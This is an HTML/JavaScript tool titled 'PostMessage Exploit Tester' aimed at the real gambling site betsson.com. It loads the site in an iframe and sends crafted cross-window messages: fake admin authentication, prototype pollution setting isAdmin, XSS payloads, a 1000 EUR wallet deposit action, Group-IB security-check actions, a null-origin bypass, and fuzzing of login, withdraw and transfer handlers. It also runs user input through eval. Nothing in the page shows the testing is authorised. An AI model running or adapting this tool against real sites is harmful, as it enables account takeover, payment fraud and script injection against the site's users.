<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PostMessage Exploit Tester - Betsson.com</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 14px;
        }
        
        .main-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            padding: 30px;
        }
        
        .panel {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 20px;
            border: 1px solid #e0e0e0;
        }
        
        .panel h2 {
            font-size: 18px;
            margin-bottom: 15px;
            color: #2a5298;
            border-bottom: 2px solid #667eea;
            padding-bottom: 10px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            font-weight: 600;
            margin-bottom: 5px;
            color: #333;
            font-size: 13px;
        }
        
        input, textarea, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            font-family: monospace;
            transition: border-color 0.3s;
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #667eea;
        }
        
        textarea {
            min-height: 100px;
            resize: vertical;
        }
        
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-right: 10px;
            margin-top: 10px;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .preset-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 10px;
        }
        
        .preset-buttons button {
            flex: 1;
            min-width: 120px;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            margin: 0;
        }
        
        iframe {
            width: 100%;
            height: 600px;
            border: 2px solid #ddd;
            border-radius: 8px;
            background: white;
        }
        
        .log-container {
            grid-column: 1 / -1;
        }
        
        #log {
            background: #1e1e1e;
            color: #00ff00;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .log-entry {
            margin-bottom: 8px;
            padding: 5px;
            border-left: 3px solid #00ff00;
            padding-left: 10px;
        }
        
        .log-entry.error {
            border-left-color: #ff4444;
            color: #ff4444;
        }
        
        .log-entry.success {
            border-left-color: #00ff00;
            color: #00ff00;
        }
        
        .log-entry.info {
            border-left-color: #44aaff;
            color: #44aaff;
        }
        
        .timestamp {
            color: #888;
            font-size: 10px;
        }
        
        .full-width {
            grid-column: 1 / -1;
        }
        
        .clear-log {
            background: #ff4444;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>PostMessage Exploit Tester</h1>
            <p>Target: betsson.com | Testing for postMessage vulnerabilities</p>
        </div>
        
        <div class="main-content">
            <div class="panel">
                <h2>Message Configuration</h2>
                
                <div class="form-group">
                    <label>Target URL:</label>
                    <input type="text" id="targetUrl" value="https://www.betsson.com">
                </div>
                
                <div class="form-group">
                    <label>Target Origin:</label>
                    <input type="text" id="targetOrigin" value="https://www.betsson.com">
                </div>
                
                <div class="form-group">
                    <label>Message Type:</label>
                    <select id="messageType">
                        <option value="json">JSON Object</option>
                        <option value="string">String</option>
                        <option value="custom">Custom JavaScript</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label>Payload:</label>
                    <textarea id="payload">{"action":"test","data":"probe"}</textarea>
                </div>
                
                <button onclick="sendMessage()">Send Message</button>
                <button onclick="loadTarget()" style="background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);">Reload Target</button>
            </div>
            
            <div class="panel">
                <h2>Preset Attack Vectors</h2>
                
                <div class="preset-buttons">
                    <button onclick="loadPreset('origin-spoof')">Origin Spoof</button>
                    <button onclick="loadPreset('proto-pollution')">Proto Pollution</button>
                    <button onclick="loadPreset('xss-payload')">XSS Attempt</button>
                    <button onclick="loadPreset('wallet-action')">Wallet Action</button>
                    <button onclick="loadPreset('groupib-action')">Group-IB Test</button>
                    <button onclick="loadPreset('null-origin')">Null Origin</button>
                    <button onclick="loadPreset('action-bruteforce')">Action Fuzzing</button>
                    <button onclick="loadPreset('deep-object')">Deep Object</button>
                </div>
                
                <div class="form-group" style="margin-top: 20px;">
                    <label>Auto-Test Suite:</label>
                    <button onclick="runAutoTest()" style="width: 100%; background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);">
                        Run Automated Tests
                    </button>
                </div>
            </div>
            
            <div class="panel full-width">
                <h2>Target Window</h2>
                <iframe id="targetFrame" src=""></iframe>
            </div>
            
            <div class="panel log-container">
                <h2>Activity Log</h2>
                <div id="log"></div>
                <button class="clear-log" onclick="clearLog()">Clear Log</button>
            </div>
        </div>
    </div>
    
    <script>
        var targetFrame;
        var messageCount = 0;
        
        window.addEventListener('DOMContentLoaded', function() {
            targetFrame = document.getElementById('targetFrame');
            log('System initialized', 'info');
            log('Listening for postMessage responses...', 'info');
            
            window.addEventListener('message', function(event) {
                log('Received message from: ' + event.origin, 'success');
                log('Data: ' + JSON.stringify(event.data, null, 2), 'info');
            });
        });
        
        function log(message, type) {
            if (!type) type = 'info';
            var logDiv = document.getElementById('log');
            var timestamp = new Date().toLocaleTimeString();
            var entry = document.createElement('div');
            entry.className = 'log-entry ' + type;
            entry.innerHTML = '<span class="timestamp">[' + timestamp + ']</span> ' + escapeHtml(message);
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        
        function escapeHtml(text) {
            var div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
            log('Log cleared', 'info');
        }
        
        function loadTarget() {
            var url = document.getElementById('targetUrl').value;
            targetFrame.src = url;
            log('Loading target: ' + url, 'info');
        }
        
        function sendMessage() {
            var origin = document.getElementById('targetOrigin').value;
            var messageType = document.getElementById('messageType').value;
            var payloadText = document.getElementById('payload').value;
            
            var payload;
            
            try {
                if (messageType === 'json') {
                    payload = JSON.parse(payloadText);
                } else if (messageType === 'string') {
                    payload = payloadText;
                } else {
                    payload = eval('(' + payloadText + ')');
                }
                
                if (targetFrame.contentWindow) {
                    targetFrame.contentWindow.postMessage(payload, origin);
                    messageCount++;
                    log('Message #' + messageCount + ' sent to ' + origin, 'success');
                    log('Payload: ' + JSON.stringify(payload, null, 2), 'info');
                } else {
                    log('Target frame not loaded', 'error');
                }
            } catch (e) {
                log('Error: ' + e.message, 'error');
            }
        }
        
        function loadPreset(preset) {
            var payloadField = document.getElementById('payload');
            var typeField = document.getElementById('messageType');
            
            var presets = {
                'origin-spoof': {
                    type: 'json',
                    payload: '{"action":"authenticate","data":{"user":"admin","token":"test"}}'
                },
                'proto-pollution': {
                    type: 'json',
                    payload: '{"__proto__":{"isAdmin":true},"action":"test","data":"pollution"}'
                },
                'xss-payload': {
                    type: 'json',
                    payload: '{"action":"eval","data":"<img src=x onerror=alert(document.domain)>"}'
                },
                'wallet-action': {
                    type: 'json',
                    payload: '{"action":"wallet.deposit","amount":1000,"currency":"EUR"}'
                },
                'groupib-action': {
                    type: 'json',
                    payload: '{"action":"groupib.validate","data":{"session":"test123"}}'
                },
                'null-origin': {
                    type: 'json',
                    payload: '{"origin":null,"action":"bypass","data":"test"}'
                },
                'action-bruteforce': {
                    type: 'custom',
                    payload: '["login","auth","authenticate","verify","validate","execute","run","process","handle","wallet","payment","deposit","withdraw","transfer"].map(function(a) { return {action: a, data: "test"}; })'
                },
                'deep-object': {
                    type: 'json',
                    payload: '{"action":"test","data":{"level1":{"level2":{"level3":{"payload":"<scr"+"ipt>alert(1)</scr"+"ipt>"}}}}}'
                }
            };
            
            if (presets[preset]) {
                typeField.value = presets[preset].type;
                payloadField.value = presets[preset].payload;
                log('Loaded preset: ' + preset, 'info');
            }
        }
        
        function runAutoTest() {
            log('Starting automated test suite...', 'info');
            
            var tests = [
                'origin-spoof',
                'proto-pollution',
                'xss-payload',
                'wallet-action',
                'groupib-action',
                'null-origin',
                'deep-object'
            ];
            
            var index = 0;
            
            function runNext() {
                if (index >= tests.length) {
                    log('Automated test suite completed', 'success');
                    return;
                }
                
                log('Running test ' + (index + 1) + '/' + tests.length + ': ' + tests[index], 'info');
                loadPreset(tests[index]);
                
                setTimeout(function() {
                    sendMessage();
                    setTimeout(function() {
                        index++;
                        runNext();
                    }, 1000);
                }, 500);
            }
            
            runNext();
        }
        
        function fuzzActions() {
            var commonActions = [
                'init', 'execute', 'run', 'process', 'handle', 'callback',
                'authenticate', 'login', 'logout', 'verify', 'validate',
                'wallet', 'payment', 'deposit', 'withdraw', 'transfer',
                'user', 'account', 'profile', 'settings', 'config',
                'data', 'fetch', 'load', 'save', 'update', 'delete',
                'groupib', 'security', 'check', 'scan', 'monitor'
            ];
            
            log('Starting action fuzzing...', 'info');
            
            commonActions.forEach(function(action, index) {
                setTimeout(function() {
                    var payload = {action: action, data: 'fuzz'};
                    targetFrame.contentWindow.postMessage(payload, '*');
                    log('Fuzzing action: ' + action, 'info');
                }, index * 200);
            });
        }
    </script>
</body>
</html>
